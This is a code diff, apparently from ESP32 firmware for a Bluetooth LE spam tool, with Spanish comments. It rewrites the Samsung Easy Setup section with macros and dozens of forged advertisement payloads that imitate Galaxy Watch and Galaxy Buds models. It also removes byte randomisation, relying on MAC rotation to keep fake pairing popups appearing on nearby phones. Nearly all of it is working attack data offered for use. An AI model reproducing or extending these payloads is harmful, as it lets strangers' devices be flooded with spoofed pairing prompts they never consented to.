@@ -50,6 +50,37 @@ typedef struct {
   uint8_t data[31];
 } spam_model_t;
 
+/*
+ * SAMSUNG EASY SETUP (Company ID 0x0075) - formatos verificados contra
+ * simondankelmann/Bluetooth-LE-Spam (generadores EasySetupWatch/EasySetupBuds,
+ * IDs originales de Flipper-XFW easysetup.c). El magic es fijo: solo cambia el
+ * id de modelo/color al final del prefijo. La variacion anti-dedup la aporta
+ * la rotacion de MAC aleatoria que ya hace el ciclo de advertising.
+ *
+ *   Watch: [0e ff 75 00] 01 00 02 00 01 01 ff 00 00 43 <watch_id>
+ *   Buds:  [1b ff 75 00] 42 09 81 02 14 15 03 21 01 09 <a> <b> 01 <c>
+ *                        06 3c 94 8e 00 00 00 00 c7 00
+ */
+#define SPAM_SAMSUNG_WATCH(id, model_name)                             \
+    {                                                                  \
+        .name = model_name,                                            \
+        .type = SPAM_TYPE_SAMSUNG_SETUP,                               \
+        .len = 15,                                                     \
+        .data = {0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,       \
+                 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, id},              \
+    }
+
+#define SPAM_SAMSUNG_BUDS(a, b, c, model_name)                         \
+    {                                                                  \
+        .name = model_name,                                            \
+        .type = SPAM_TYPE_SAMSUNG_SETUP,                               \
+        .len = 28,                                                     \
+        .data = {0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,       \
+                 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, a, b, 0x01, c,    \
+                 0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00,       \
+                 0xc7, 0x00},                                          \
+    }
+
 static const spam_model_t spam_models[] = {
     /* =========================================================================
      * 1. APPLE PROXIMITY PAIRING (AirPods, Beats) - Type 0x07
@@ -338,40 +369,58 @@ static const spam_model_t spam_models[] = {
     },
 
     /* =========================================================================
-     * 5. SAMSUNG EASY SETUP / QUICK PAIRING - Company ID 0x0075 (100% Battery & Lid Open)
+     * 5. SAMSUNG EASY SETUP - Company ID 0x0075
+     * Watch = baliza Galaxy Watch (popup "Como conectar tu reloj");
+     * Buds  = EasySetup de auriculares (popup de emparejamiento Buds).
+     * IDs genuinos de Flipper-XFW easysetup.c / simondankelmann.
      * ========================================================================= */
-    {
-        .name = "Galaxy Buds Live",
-        .type = SPAM_TYPE_SAMSUNG_SETUP,
-        .len = 27,
-        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x01, 0x01, 0x00,
-                 0x00, 0x00, 0x64, 0x64, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-    },
-    {
-        .name = "Galaxy Buds Pro",
-        .type = SPAM_TYPE_SAMSUNG_SETUP,
-        .len = 27,
-        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x02, 0x01, 0x00,
-                 0x00, 0x00, 0x64, 0x64, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-    },
-    {
-        .name = "Galaxy Buds2 Pro",
-        .type = SPAM_TYPE_SAMSUNG_SETUP,
-        .len = 27,
-        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x03, 0x01, 0x00,
-                 0x00, 0x00, 0x64, 0x64, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-    },
-    {
-        .name = "Galaxy Watch Setup",
-        .type = SPAM_TYPE_SAMSUNG_SETUP,
-        .len = 27,
-        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x04, 0x01, 0x00,
-                 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-    },
+    SPAM_SAMSUNG_WATCH(0x1a, "Fallback Watch"),
+    SPAM_SAMSUNG_WATCH(0x01, "White W4 Classic 44mm"),
+    SPAM_SAMSUNG_WATCH(0x02, "Black W4 Classic 40mm"),
+    SPAM_SAMSUNG_WATCH(0x03, "White W4 Classic 40mm"),
+    SPAM_SAMSUNG_WATCH(0x04, "Black W4 44mm"),
+    SPAM_SAMSUNG_WATCH(0x05, "Silver W4 44mm"),
+    SPAM_SAMSUNG_WATCH(0x06, "Green W4 44mm"),
+    SPAM_SAMSUNG_WATCH(0x07, "Black W4 40mm"),
+    SPAM_SAMSUNG_WATCH(0x08, "White W4 40mm"),
+    SPAM_SAMSUNG_WATCH(0x09, "Gold W4 40mm"),
+    SPAM_SAMSUNG_WATCH(0x0a, "French W4"),
+    SPAM_SAMSUNG_WATCH(0x0b, "French W4 Classic"),
+    SPAM_SAMSUNG_WATCH(0x0c, "Fox W5 44mm"),
+    SPAM_SAMSUNG_WATCH(0x11, "Black W5 44mm"),
+    SPAM_SAMSUNG_WATCH(0x12, "Sapphire W5 44mm"),
+    SPAM_SAMSUNG_WATCH(0x13, "Purple W5 40mm"),
+    SPAM_SAMSUNG_WATCH(0x14, "Gold W5 40mm"),
+    SPAM_SAMSUNG_WATCH(0x15, "Black W5 Pro 45mm"),
+    SPAM_SAMSUNG_WATCH(0x16, "Gray W5 Pro 45mm"),
+    SPAM_SAMSUNG_WATCH(0x17, "White W5 44mm"),
+    SPAM_SAMSUNG_WATCH(0x18, "White Black W5"),
+    SPAM_SAMSUNG_WATCH(0x1b, "Black W6 Pink 40mm"),
+    SPAM_SAMSUNG_WATCH(0x1c, "Gold W6 40mm"),
+    SPAM_SAMSUNG_WATCH(0x1d, "Silver W6 Cyan 44mm"),
+    SPAM_SAMSUNG_WATCH(0x1e, "Black W6 Classic 43mm"),
+    SPAM_SAMSUNG_WATCH(0x20, "Green W6 Classic 43mm"),
+
+    SPAM_SAMSUNG_BUDS(0xee, 0x7a, 0x0c, "Fallback Buds"),
+    SPAM_SAMSUNG_BUDS(0x9d, 0x17, 0x00, "Fallback Dots"),
+    SPAM_SAMSUNG_BUDS(0x39, 0xea, 0x48, "Light Purple Buds2"),
+    SPAM_SAMSUNG_BUDS(0xa7, 0xc6, 0x2c, "Bluish Silver Buds2"),
+    SPAM_SAMSUNG_BUDS(0x85, 0x01, 0x16, "Black Buds Live"),
+    SPAM_SAMSUNG_BUDS(0x3d, 0x8f, 0x41, "Gray Black Buds2"),
+    SPAM_SAMSUNG_BUDS(0x3b, 0x6d, 0x02, "Bluish Chrome Buds2"),
+    SPAM_SAMSUNG_BUDS(0xae, 0x06, 0x3c, "Gray Beige Buds2"),
+    SPAM_SAMSUNG_BUDS(0xb8, 0xb9, 0x05, "Pure White Buds"),
+    SPAM_SAMSUNG_BUDS(0xea, 0xaa, 0x17, "Pure White Buds2"),
+    SPAM_SAMSUNG_BUDS(0xd3, 0x07, 0x04, "Black Buds"),
+    SPAM_SAMSUNG_BUDS(0x9d, 0xb0, 0x06, "French Flag Buds"),
+    SPAM_SAMSUNG_BUDS(0x10, 0x1f, 0x1a, "Dark Purple Buds Live"),
+    SPAM_SAMSUNG_BUDS(0x85, 0x96, 0x08, "Dark Blue Buds"),
+    SPAM_SAMSUNG_BUDS(0x8e, 0x45, 0x03, "Pink Buds"),
+    SPAM_SAMSUNG_BUDS(0x2c, 0x67, 0x40, "White Black Buds2"),
+    SPAM_SAMSUNG_BUDS(0x3f, 0x67, 0x18, "Bronze Buds Live"),
+    SPAM_SAMSUNG_BUDS(0x42, 0xc5, 0x19, "Red Buds Live"),
+    SPAM_SAMSUNG_BUDS(0xae, 0x07, 0x3a, "Black White Buds2"),
+    SPAM_SAMSUNG_BUDS(0x01, 0x17, 0x16, "Sleek Black Buds2"),
 };
 
 #define TOTAL_SPAM_MODELS (sizeof(spam_models) / sizeof(spam_models[0]))
@@ -448,10 +497,9 @@ static uint8_t prepare_payload(int index, uint8_t* out_buffer) {
       break;
 
     case SPAM_TYPE_SAMSUNG_SETUP:
-      /* Randomize session salt / nonce (bytes 9-11) while maintaining 100% battery & lid open */
-      out_buffer[9] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[10] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[11] = (uint8_t)(esp_random() & 0xFF);
+      /* Magic EasySetup fijo: en Watch los bytes 8-13 son parte de la firma
+       * (01 ff 00 00 43). No randomizar nada aqui; la variacion anti-dedup
+       * proviene del id de modelo y de la MAC aleatoria por ciclo. */
       break;
 
     case SPAM_TYPE_GOOGLE_FAST_PAIR:
